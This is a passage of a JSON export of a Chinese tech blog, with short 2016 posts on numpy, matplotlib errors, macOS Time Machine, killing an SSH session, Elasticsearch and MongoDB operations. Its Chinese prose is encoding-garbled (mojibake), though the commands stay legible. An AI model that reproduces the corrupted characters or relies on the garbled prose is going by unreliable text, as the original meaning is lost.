¼å¼ç›¸åŒã€‚è¿™ä¸ªå‡½æ•°æœ‰å‡ ä¸ªå¸¸ç”¨çš„å‚æ•°ï¼Œè¿™é‡Œç»™å‡ºäº†å‚æ•°çš„æ„ä¹‰ã€‚[quote]fnameï¼šè¯»å–æ–‡ä»¶çš„æ–‡ä»¶åã€‚ä¾‹å¦‚C:/Dataset/iris.txtã€‚delimiterï¼šæ•°æ®ä¹‹é—´çš„åˆ†éš”ç¬¦ã€‚å¦‚ä½¿ç”¨é€—å·&quot;,&quot;ã€‚dtypeï¼šæ•°æ®ç±»å‹ã€‚å¦‚floatï¼Œstrç­‰ã€‚usecolsï¼šé€‰å–æ•°æ®çš„åˆ—ã€‚[/quote]è¿™é‡Œä¸»è¦è¯´ä¸€ä¸‹usecolsçš„ç”¨æ³•ã€‚å¦‚æœiris.txtä¸­çš„å‰4åˆ—ï¼Œåˆ™usecols=(0,1,2,3)ã€‚å¦‚æœå–ç¬¬5åˆ—è¿™ä¸€åˆ—ï¼Œåˆ™usecols=(4,)ã€‚è¿™ç§å–å•ä¸€åˆ—çš„æƒ…å†µå®¹æ˜“å‡ºé—®é¢˜ï¼Œè¯·å¤§å®¶å¤šæ³¨æ„ã€‚æ•´ä¸ªè¯­å¥å¦‚ä¸‹ï¼š[code]loadtxt(&quot;./data.csv&quot; , delimiter = &quot;,&quot; , usecols=(0,1,2,3) , dtype=float)loadtxt(&quot;./data.csv&quot; , delimiter = &quot;,&quot; , usecols=(4,) , dtype=str)[/code]","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"numpy","slug":"numpy","permalink":"https://wangxiuwen.github.io/tags/numpy/"}],"author":"wangxiuwen"},{"title":"matplotlib æŠ¥é”™","slug":"history/tech/5953c4d0c2b92f5665eeda3a","date":"2016-05-08T02:58:40.000Z","updated":"2020-11-29T01:42:08.755Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eeda3a/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eeda3a/","excerpt":"","text":"code localhost:python wangwilliam$ python test.pyTraceback (most recent call last):File â€œtest.pyâ€, line 6, in &lt;module&gt;import matplotlib.pyplot as pltFile â€œ/Users/wangwilliam/projects/mycode/python/venv/lib/python2.7/site-packages/matplotlib/pyplot.pyâ€, line 114, in &lt;module&gt;_backend_mod, new_figure_manager, draw_if_interactive, _show = pylab_setup()File â€œ/Users/wangwilliam/projects/mycode/python/venv/lib/python2.7/site-packages/matplotlib/backends/init.pyâ€, line 32, in pylab_setupglobals(),locals(),[backend_name],0)File â€œ/Users/wangwilliam/projects/mycode/python/venv/lib/python2.7/site-packages/matplotlib/backends/backend_macosx.pyâ€, line 24, in &lt;module&gt;from matplotlib.backends import _macosxRuntimeError: Python is not installed as a framework. The Mac OS X backend will not be able to function correctly if Python is not installed as a framework. See the Python documentation for more information on installing Python as a framework on Mac OS X. Please either reinstall Python as a framework, or try one of the other backends. If you are Working with Matplotlib in a virtual enviroment see â€˜Working with Matplotlib in Virtual environmentsâ€™ in the Matplotlib FAQ.[/code]åœ¨ [url=http://stackoverflow.com/questions/31373163/anaconda-runtime-error-python-is-not-installed-as-a-framework]stackoverflow[/url] æœç´¢åˆ°ä»¥ä¸‹è§£å†³æ–¹æ¡ˆï¼š[quote]I was having the same problem. Installing an older version of matplotlib did the trick for me. Try this command in your terminal while in your virtual environment:[code]pip install matplotlib==1.4.3[/code][/quote]é‡æ–°å®‰è£…matplotlibï¼š[code]pip install matplotlib==1.4.3[/code]","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"matplotlib","slug":"matplotlib","permalink":"https://wangxiuwen.github.io/tags/matplotlib/"}],"author":"wangxiuwen"},{"title":"mac å¿«æ·é”®","slug":"history/tech/5953c73311a1d5578f3f9a63","date":"2016-05-08T01:04:36.000Z","updated":"2020-11-29T01:42:08.759Z","comments":true,"path":"history/tech/5953c73311a1d5578f3f9a63/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c73311a1d5578f3f9a63/","excerpt":"","text":"[url=https://support.apple.com/zh-cn/HT201236]å®˜æ–¹é“¾æ¥åœ°å€[/url]","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"OSX","slug":"OSX","permalink":"https://wangxiuwen.github.io/tags/OSX/"}],"author":"wangxiuwen"},{"title":"åˆ é™¤ mac time machine æœ¬åœ°å¤‡ä»½","slug":"history/tech/5953c73311a1d5578f3f9a62","date":"2016-05-08T00:29:42.000Z","updated":"2020-11-29T01:42:08.759Z","comments":true,"path":"history/tech/5953c73311a1d5578f3f9a62/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c73311a1d5578f3f9a62/","excerpt":"","text":"è¿›å…¥ç£ç›˜ç›®å½•ç®¡ç†ï¼Œå¯ä»¥çœ‹åˆ°æœ‰ä¸€ä¸ªMobileBackupsæ–‡ä»¶å¤¹ï¼Œæ‰“å¼€å‘ç°é‡Œé¢æœ‰ä¸€ä¸ªBackups.backupdbï¼Œå°±æ˜¯æœ¬åœ°å¤‡ä»½æ–‡ä»¶ï¼æˆ‘ä»¬éœ€è¦åˆ é™¤å®ƒã€‚[code]cd /Volumes[/code]é”™è¯¯æ–¹å¼ï¼š[code]sudo rm -R xxxxx[/code]æ­£ç¡®æ–¹å¼ï¼šå…³é—­ï¼š[code]sudo tmutil disablelocal[/code]å¼€å¯ï¼š[code]sudo tmutil enablelocal [/code]","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"OSX","slug":"OSX","permalink":"https://wangxiuwen.github.io/tags/OSX/"}],"author":"wangxiuwen"},{"title":"mac å®‰è£…pcre openssl","slug":"history/tech/5953c73311a1d5578f3f9a61","date":"2016-05-07T21:59:54.000Z","updated":"2020-11-29T01:42:08.759Z","comments":true,"path":"history/tech/5953c73311a1d5578f3f9a61/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c73311a1d5578f3f9a61/","excerpt":"","text":"[code]brew install pcrebrew install openssl[/code]","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"OSX","slug":"OSX","permalink":"https://wangxiuwen.github.io/tags/OSX/"}],"author":"wangxiuwen"},{"title":"linux æ€æ­»è¿œç¨‹ç™»å½•ç”¨æˆ·","slug":"history/tech/5953c73311a1d5578f3f9a60","date":"2016-05-05T19:37:17.000Z","updated":"2020-11-29T01:42:08.759Z","comments":true,"path":"history/tech/5953c73311a1d5578f3f9a60/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c73311a1d5578f3f9a60/","excerpt":"","text":"1.é¦–å…ˆçœ‹ä¸€ä¸‹å½“å‰æœ‰å“ªäº›ç”¨æˆ·åœ¨æœåŠ¡å™¨ä¸­ï¼Œç”¨who å‘½ä»¤ä¹Ÿè¡Œï¼Œ w å‘½ä»¤æ˜¾ç¤ºçš„ä¿¡æ¯æ›´å…¨ä¸€äº›[code][root@Scpman ~]# w13:12:29 up 1:46, 5 users, load average: 0.18, 0.16, 0.23USER TTY FROM LOGIN@ IDLE JCPU PCPU WHATroot tty3 - 12:10 53:04 0.07s 0.07s -bashroot tty1 :0 11:27 1:46m 5:25 5:25 /usr/bin/Xorg :root pts/0 :0.0 12:34 21:40 0.12s 0.07s man scproot pts/2 :0.0 12:54 0.00s 0.05s 0.00s wxxx pts/3 192.168.99.7 13:12 23.00s 0.01s 0.01s -bash //è¿™ä¸ªäººï¼Œäººå“ä¸å¥½ï¼Œæˆ‘ä¸æƒ³è®©ä»–åœ¨é‡Œé¢ç©äº†[/code] [code][root@Scpman ~]# ps -aux | grep pts/3 //æ³¨æ„çœ‹å¥½è¿™ä¸ªå“¦ï¼Œä¸è¦æé”™äº†ï¼Œç”¨ps -aux æ˜¾ç¤ºè¿›ç¨‹ï¼Œç„¶åç”¨grep ç­›é€‰å¯¹æˆ‘ä»¬æœ‰ç”¨çš„ä¿¡æ¯Warning: bad syntax, perhaps a bogus â€˜-â€™? See /usr/share/doc/procps-3.2.8/FAQxxx 4890 0.0 0.0 108796 1704 ? S 13:12 0:00 sshd: xxx@pts/3 // tç¬¬ä¸€æ¡xxx 4891 0.0 0.0 110564 1856 pts/3 Ss+ 13:12 0:00 -bash //ç¬¬äºŒæ¡root 4943 0.0 0.0 103392 820 pts/2 S+ 13:12 0:00 grep â€“color=auto pts/3[/code] [code][root@Scpman ~]# kill 4890 //æ³¨æ„åœ¨ä¸Šé¢çš„æ—¶å€™æœ‰ä¸¤æ¡ï¼Œä¸€èˆ¬æ€æ‰æ•°å­—å°çš„è¿›ç¨‹ã€‚4890å°äº4891[/code]å¥½äº†ï¼Œå†çœ‹ä¸€ä¸‹å½“å‰æœ‰è°åœ¨ç³»ç»Ÿé‡Œ[code][root@Scpman ~]# w13:23:22 up 1:57, 4 users, load average: 0.36, 0.23, 0.23USER TTY FROM LOGIN@ IDLE JCPU PCPU WHATroot tty3 - 12:10 1:03m 0.07s 0.07s -bashroot tty1 :0 11:27 1:57m 5:56 5:56 /usr/bin/Xorg :root pts/0 :0.0 12:34 32:33 0.12s 0.07s man scproot pts/2 :0.0 12:54 0.00s 0.07s 0.00s w[root@Scpman ~]#[/code]","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"linux","slug":"linux","permalink":"https://wangxiuwen.github.io/tags/linux/"}],"author":"wangxiuwen"},{"title":"äº‹åŠ¡æ—¥å¿— translog","slug":"history/tech/5953c73311a1d5578f3f9a5f","date":"2016-05-03T00:06:00.000Z","updated":"2020-11-29T01:42:08.759Z","comments":true,"path":"history/tech/5953c73311a1d5578f3f9a5f/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c73311a1d5578f3f9a5f/","excerpt":"","text":"æ¯ä¸ªåˆ†ç‰‡éƒ½æœ‰ä¸€ä¸ªäº‹åŠ¡æ—¥å¿—æ–‡ä»¶ï¼Œäº‹åŠ¡æ—¥å¿—æ–‡ä»¶ä¸»è¦æ˜¯ä¸ºäº†ä¿è¯ç´¢å¼•å†™å’Œåˆ é™¤è¿‡ç¨‹çš„å¯é æ€§ï¼Œä½ ä¸éœ€è¦æ˜¾å¼çš„å»æäº¤æ¯ä¸ªè¯·æ±‚ï¼ˆå¯¹åº”äºluceneçš„commitï¼‰ï¼Œè¿™ä¸€åˆ‡éƒ½æ˜¯è‡ªåŠ¨çš„ï¼Œä½ ä¹Ÿå¯ä»¥æ˜¾å¼çš„æ‰§è¡Œflushæ“ä½œæ¥è¿›è¡Œè¯·æ±‚çš„æäº¤ï¼Œè¿˜å¯ä»¥ä½¿ç”¨ä¸‹é¢è¿™äº›å‚æ•°æ¥è¿›è¡Œæ§åˆ¶:è®¾ç½®å½“ç´¯è®¡æ“ä½œè¾¾åˆ°å¤šå°‘æ—¶å°±æ‰§è¡Œflushæ“ä½œï¼Œé»˜è®¤å€¼ 5000ï¼š[code]index.translog.flush_threshold_ops[/code]ä¸€æ—¦ä½ çš„äº‹åŠ¡æ—¥å¿—æ–‡ä»¶çš„å¤§å°ï¼ˆtranslogï¼‰è¾¾åˆ°è®¾ç½®çš„è¿™ä¸ªå€¼ï¼Œåˆ™å¼€å§‹æ‰§è¡Œflushæ“ä½œï¼Œé»˜è®¤å€¼500mbï¼š[code]index.translog.flush_threshold_size[/code]æ¯éš”å¤šé•¿æ—¶é—´æ‰§è¡Œä¸€æ¬¡flushï¼Œé»˜è®¤ 60mï¼š[code]index.translog.flush_threshold_period [/code]","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"elasticsearch","slug":"elasticsearch","permalink":"https://wangxiuwen.github.io/tags/elasticsearch/"}],"author":"wangxiuwen"},{"title":"mongodb oplogçš„æ ¼å¼","slug":"history/tech/5953c73311a1d5578f3f9a5c","date":"2016-04-29T02:48:26.000Z","updated":"2020-11-29T01:42:08.759Z","comments":true,"path":"history/tech/5953c73311a1d5578f3f9a5c/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c73311a1d5578f3f9a5c/","excerpt":"","text":"å®ƒçš„æ ¼å¼åœ¨ä¸åŒç‰ˆæœ¬çš„mongodbä¸Šæœ‰æ‰€åŒºåˆ«ï¼Œå¤§è‡´æ˜¯ï¼š[code]PRIMARY&gt; db.version()2.2.2PRIMARY&gt; db.oplog.rs.findOne(){&quot;ts&quot; : Timestamp(1364186197000, 58),&quot;h&quot; : NumberLong(&quot;-7878220425718087654&quot;),&quot;v&quot; : 2,&quot;op&quot; : &quot;u&quot;,&quot;ns&quot; : &quot;exaitem_gmsbatchtask.jdgmsbatchtask&quot;,&quot;o2&quot; : {&quot;_id&quot; : &quot;83f09a98-6a41-497b-a988-99ba5399d296&quot;},&quot;o&quot; : {&quot;_id&quot; : &quot;83f09a98-6a41-497b-a988-99ba5399d296&quot;,&quot;status&quot; : 2,&quot;content&quot; : &quot;&quot;,&quot;type&quot; : 17,&quot;business&quot; : &quot;832722&quot;,&quot;optype&quot; : 2,&quot;addDate&quot; : ISODate(&quot;2013-03-25T04:36:38.511Z&quot;),&quot;modifyDate&quot; : ISODate(&quot;2013-03-25T04:36:39.131Z&quot;),&quot;source&quot; : 5}[/code]ts ç”±4ä¸ªå­—èŠ‚çš„timestamp å’Œ 4å­—èŠ‚çš„è‡ªå¢è®¡æ•°å™¨è¡¨ç¤ºã€‚opï¼š[code]â€œiâ€ï¼š insertâ€œuâ€ï¼š updateâ€œdâ€ï¼š deleteâ€œcâ€ï¼š db cmdâ€œdbâ€ï¼šå£°æ˜å½“å‰æ•°æ®åº“ (å…¶ä¸­ns è¢«è®¾ç½®æˆä¸º=&gt;æ•°æ®åº“åç§°+ â€˜.â€™)â€œnâ€: no op,å³ç©ºæ“ä½œï¼Œå…¶ä¼šå®šæœŸæ‰§è¡Œä»¥ç¡®ä¿æ—¶æ•ˆæ€§ ã€‚nsï¼šæ“ä½œçš„namespaceoï¼šæ“ä½œå¯¹åº”çš„documentï¼Œå³å½“å‰æ“ä½œçš„å†…å®¹ï¼ˆæ¯”å¦‚æ›´æ–°æ“ä½œæ—¶è¦æ›´æ–°çš„çš„å­—æ®µå’Œå€¼ï¼Œé‚£äº›æ²¡æœ‰è¢«æ›´æ–°çš„å­—æ®µåŠå¯¹åº”çš„å€¼ä¹Ÿä¼šåœ¨è¿™é‡Œé¢ï¼‰o2ï¼šæ‰§è¡Œæ›´æ–°æ“ä½œçš„æ¡ä»¶ï¼Œåªæœ‰updateæ‰æœ‰è¯¥å±æ€§ã€‚[/code]","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"mongodb","slug":"mongodb","permalink":"https://wangxiuwen.github.io/tags/mongodb/"}],"author":"wangxiuwen"},{"title":"åˆ é™¤æ–‡æ¡£","slug":"history/tech/5953c73311a1d5578f3f9a5b","date":"2016-04-29T02:42:14.000Z","updated":"2020-11-29T01:42:08.759Z","comments":true,"path":"history/tech/5953c73311a1d5578f3f9a5b/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c73311a1d5578f3f9a5b/","excerpt":"","text":"åˆ é™¤æ–‡æ¡£æ˜¯ç›¸å½“ç›´è§‚çš„ã€‚ä»¥ä¸‹çš„ä¾‹å­å±•ç¤ºäº†æˆ‘ä»¬æ€æ ·åˆ é™¤IDä¸º2çš„æ–‡æ¡£ï¼š[code]curl -XDELETE â€˜localhost:9200/customer/external/2?prettyâ€™ [/code]æˆ‘ä»¬ä¹Ÿèƒ½å¤Ÿä¸€æ¬¡åˆ é™¤ç¬¦åˆæŸä¸ªæŸ¥è¯¢æ¡ä»¶çš„å¤šä¸ªæ–‡æ¡£ã€‚ä»¥ä¸‹çš„ä¾‹å­å±•ç¤ºäº†å¦‚ä½•åˆ é™¤åå­—ä¸­åŒ…å«â€œJohnâ€çš„æ‰€æœ‰çš„å®¢æˆ·ï¼š [code]curl -XDELETE â€˜localhost:9200/customer/external/_query?prettyâ€™ -d â€™ { â€œqueryâ€: { â€œmatchâ€: { â€œnameâ€: â€œJohnâ€ } } }â€™[/code]æ³¨æ„ï¼Œä»¥ä¸Šçš„URIå˜æˆäº†/_queryï¼Œä»¥æ­¤æ¥è¡¨æ˜è¿™æ˜¯ä¸€ä¸ªâ€œæŸ¥è¯¢åˆ é™¤â€APIï¼Œå…¶ä¸­åˆ é™¤æŸ¥è¯¢æ ‡å‡†æ”¾åœ¨è¯·æ±‚ä½“ä¸­ï¼Œä½†æ˜¯æˆ‘ä»¬ä»ç„¶ä½¿ç”¨DELETEã€‚","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"elasticsearch","slug":"elasticsearch","permalink":"https://wangxiuwen.github.io/tags/elasticsearch/"}],"author":"wangxiuwen"},{"title":"python çœ‹æ–‡æ¡£","slug":"history/tech/5953c73311a1d5578f3f9a5a","date":"2016-04-29T02:27:06.000Z","updated":"2020-11-29T01:42:08.755Z","comments":true,"path":"history/tech/5953c73311a1d5578f3f9a5a/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c73311a1d5578f3f9a5a/","excerpt":"","text":"[code]import scipyprint scipy.quiver.doc[/code]æˆ–è€…[code]import scipyprint help(scipy.quiver)[/code]","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"python","slug":"python","permalink":"https://wangxiuwen.github.io/tags/python/"}],"author":"wangxiuwen"},{"title":"linux æœç´¢æ–‡ä»¶å†…å®¹","slug":"history/tech/5953c73311a1d5578f3f9a5e","date":"2016-04-28T19:04:05.000Z","updated":"2020-11-29T01:42:08.759Z","comments":true,"path":"history/tech/5953c73311a1d5578f3f9a5e/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c73311a1d5578f3f9a5e/","excerpt":"","text":"[code]grep -Rn --color=auto --include=&quot;.&quot; &quot;config_file&quot; ./ -C 0[/code]","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"linux","slug":"linux","permalink":"https://wangxiuwen.github.io/tags/linux/"}],"author":"wangxiuwen"},{"title":"hdfs åˆå¹¶ç”Ÿæˆçš„æ–‡ä»¶","slug":"history/tech/5953c73311a1d5578f3f9a5d","date":"2016-04-28T18:57:22.000Z","updated":"2020-11-29T01:42:08.759Z","comments":true,"path":"history/tech/5953c73311a1d5578f3f9a5d/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c73311a1d5578f3f9a5d/","excerpt":"","text":"[code]bin/hdfs dfs -getmerge hdfs://master:8080/output result[/code]","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"hdfs","slug":"hdfs","permalink":"https://wangxiuwen.github.io/tags/hdfs/"}],"author":"wangxiuwen"},{"title":"redis 3.0.7ç¼–è¯‘å®‰è£…","slug":"history/tech/5953c73311a1d5578f3f9a59","date":"2016-04-28T03:35:37.000Z","updated":"2020-11-29T01:42:08.755Z","comments":true,"path":"history/tech/5953c73311a1d5578f3f9a59/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c73311a1d5578f3f9a59/","excerpt":"","text":"1234cd deps; make hiredis lua jemalloc linenoisecd ..make MALLOC=libcmake PREFIX=/usr/local/redis installæˆ–1234cd deps; make hiredis lua jemalloc linenoisecd ..make MALLOC=jemallocmake PREFIX=/usr/local/redis install","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"redis","slug":"redis","permalink":"https://wangxiuwen.github.io/tags/redis/"}],"author":"wangxiuwen"},{"title":"supervisord å¸¸ç”¨æ“ä½œ","slug":"history/tech/5953c4d0c2b92f5665eeda39","date":"2016-04-18T03:31:30.000Z","updated":"2020-11-29T01:42:08.755Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eeda39/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eeda39/","excerpt":"","text":"help æŸ¥çœ‹å‘½ä»¤å¸®åŠ©ï¼Œå¦‚ï¼š[code]supervisorctl help rereadupdate Reload config and add/remove as necessaryreload Restart the remote supervisord.reread Reload the daemonâ€™s configuration filesstart/restart/stop program_name (æ³¨æ„,è¿™é‡Œä¸ä¼šé‡æ–°updateé…ç½®,æ‰€ä»¥è¦rereadä¸‹)[/code]","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"linux","slug":"linux","permalink":"https://wangxiuwen.github.io/tags/linux/"}],"author":"wangxiuwen"},{"title":"mongodb å¢é‡å¤‡ä»½","slug":"history/tech/5953c4d0c2b92f5665eeda38","date":"2016-04-17T21:30:19.000Z","updated":"2020-11-29T01:42:08.755Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eeda38/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eeda38/","excerpt":"","text":"mongodbæ•°æ®é‡å˜å¤§åï¼Œå¤‡ä»½æ•°æ®å°±ä¼šæˆä¸ºå¤´ç–¼çš„é—®é¢˜äº†ï¼Œå¤‡ä»½è€—æ—¶ä¼šè¶Šæ¥è¶Šé•¿äº†ã€‚ä¸‹é¢ä»‹ç»ä¸€æ¬¾mongodbå¢é‡å¤‡ä»½ä¸æ¢å¤å·¥å…·mongobackupã€‚ä»‹ç»mongobackupæ˜¯ç”¨äºå¤åˆ¶é›†çš„å¢é‡å¤‡ä»½ä¸æ¢å¤å·¥å…·ã€‚åœ¨æ¢å¤æ—¶ï¼Œéœ€è¦ç»“åˆå…¨é‡å¤‡ä»½ä¸æ¢å¤ä½¿ç”¨ã€‚å‚è§ï¼šhttp://pan.baidu.com/s/1u1vwu#dirå¢é‡å¤‡ä»½2.1 å…¨é‡å¤‡ä»½ mongobackup -u ttlsa -p â€˜www.ttlsa.comâ€™ --port 27017 -h 10.1.11.99 --backup1 mongobackup -u ttlsa -p â€˜www.ttlsa.comâ€™ --port 27017 -h 10.1.11.99 --backup2.2 æµæ¨¡å¼å¤‡ä»½ mongobackup -u ttlsa -p â€˜www.ttlsa.comâ€™ --port 27017 â€“h 10.1.11.99 --backup --stream1 mongobackup -u ttlsa -p â€˜www.ttlsa.comâ€™ --port 27017 â€“h 10.1.11.99 --backup --stream2.3 æŒ‡å®šå¤‡ä»½åˆå§‹æ—¶é—´ç‚¹ mongobackup -u ttlsa -p â€˜www.ttlsa.comâ€™ --port 27017 -h 10.1.11.99 --backup -s 1385367056,11 mongobackup -u ttlsa -p â€˜www.ttlsa.comâ€™ --port 27017 -h 10.1.11.99 --backup -s 1385367056,1å¢é‡ æ¢å¤å¿…é¡»æŒ‡å®šèµ·æ­¢æ—¶é—´ç‚¹ï¼Œé…åˆå…¨å¤‡ï¼Œå¯ä»¥æ¢å¤åˆ°ä»»æ„æ—¶é—´ç‚¹ï¼ˆç»“æŸæ—¶é—´ç‚¹ï¼‰ï¼Œå¼€å§‹æ—¶é—´ç‚¹å¯ä»¥ç†è§£ä¸ºå…¨å¤‡çš„æ—¶é—´ç‚¹ã€‚ mongobackup -u ttlsa -p â€˜www.ttlsa.comâ€™ --port 27017 -h 10.1.11.99 --recovery -s 1385367098,27350 -t 1385367132,35490 ./backup/1 mongobackup -u ttlsa -p â€˜www.ttlsa.comâ€™ --port 27017 -h 10.1.11.99 --recovery -s 1385367098,273","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"mongodb","slug":"mongodb","permalink":"https://wangxiuwen.github.io/tags/mongodb/"}],"author":"wangxiuwen"},{"title":"pythonä¸­æ–‡æ³¨é‡Šæ–¹æ³•","slug":"history/tech/5953c4d0c2b92f5665eeda37","date":"2016-04-16T19:06:54.000Z","updated":"2020-11-29T01:42:08.755Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eeda37/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eeda37/","excerpt":"","text":"åœ¨pythonç¼–å†™ä»£ç çš„æ—¶å€™ï¼Œé¿å…ä¸äº†ä¼šå‡ºç°æˆ–æ˜¯ç”¨åˆ°ä¸­æ–‡ï¼Œè¿™æ—¶å€™ä½ éœ€è¦åœ¨æ–‡ä»¶å¼€å¤´åŠ ä¸Šä¸­æ–‡æ³¨é‡Šã€‚å¦‚æœå¼€å¤´ä¸å£°æ˜ä¿å­˜ç¼–ç çš„æ ¼å¼æ˜¯ä»€ä¹ˆï¼Œé‚£ä¹ˆå®ƒä¼šé»˜è®¤ä½¿ç”¨ASKIIç ä¿å­˜æ–‡ä»¶ï¼Œè¿™æ—¶å¦‚æœä½ çš„ä»£ç ä¸­æœ‰ä¸­æ–‡å°±ä¼šå‡ºé”™äº†ï¼Œå³ä½¿ä½ çš„ä¸­æ–‡æ˜¯åŒ…å«åœ¨æ³¨é‡Šé‡Œé¢çš„ã€‚æ‰€ä»¥åŠ 